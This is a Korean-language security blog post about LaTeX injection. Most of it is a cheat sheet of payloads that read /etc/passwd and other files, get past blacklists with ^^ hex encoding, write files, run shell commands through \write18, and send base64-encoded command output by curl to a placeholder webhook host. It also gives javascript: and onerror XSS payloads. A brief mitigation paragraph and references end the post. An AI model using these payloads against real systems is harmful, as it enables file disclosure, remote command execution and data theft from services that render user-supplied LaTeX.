---
layout: post
title: LaTeX Injection
subtitle: 2년동안 딱 한번 본 케이스....
author: g3rm
categories: Web
banner:
  image: /assets/images/banners/home.gif
  opacity: 0.618
  background: "#000"
  heading_style: "font-size: 4.25em; font-weight: bold;"
  subheading_style: "color: gold"
tags:
  - Excel
  - CSV
  - DDE
  - Formula_Injection
sidebar:
---
## Intro
$ \LaTeX $ 란 주로 자연과학 혹은 수리 영역 논문에 사용되는 문서 작성 도구의 일종으로 $ \TeX $ 문법을 쉽게 사용하기 위해 만든 메크로 모음집이다.   

스크립트 기능이 강하기 때문에 RCE, XSS 등의 공격이 가능하여 위험도는 매우 높습니다.   
## Detect & Exploit 
### Detect
아래 사진과 같은 수식들이 보인다면 LaTeX 문법을 사용하고 있을 가능성이 큽니다.  
![](/assets/images/posts/2024-12-05-LaTeX-Injection/LaTeXInjection_Exam.png)   
### Exploit
#### Read File
```tex
\input{/etc/passwd}
\include{somefile} # load .tex file (somefile.tex)
```   

```tex
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```   
```tex
\lstinputlisting{/etc/passwd}
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```   

```tex
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```

#### Bypass Blacklist 

- ^^41 == A
- ^^7e == ~
```tex
\lstin^^70utlisting{/etc/passwd}
```

#### Write File

```tex
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\write\outfile{Line 2}
\write\outfile{I like trains}
\closeout\outfile
```

#### Command Execution

```tex
\immediate\write18{id > output}
\input{output}
```   

```tex
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```   

```tex
\input|ls|base64
\input{|"/bin/hostname"}
```   

```tex
\immediate/write18{curl https://webhook -X POST -d a=$(id|base64)}
```

#### Cross Site Scripting

```tex
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```   

```tex
\unicode{<img src=1 onerror="<ARBITRARY_JS_CODE>">}
```   
## Security Measures
사용자 입력 값이 LaTeX에 영향이 가지 않도록 하거나, 서비스 특성상
사용자가 스스로 LaTeX 문법을 이용하여 작성해야 한다면, 공격 가능한 패키지들을 포함시키지 않거나, LaTeX 문법을 실행시키는 `\`,`$` 과 같은 특수문자를 필터링해야 합니다.   
## References
[mathjax](https://docs.mathjax.org/en/latest/input/tex/extensions/autoload.html#autoload-options)   
[LaTeX Payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection)   
[hahwul](https://www.hahwul.com/cullinan/latex-injection/)   
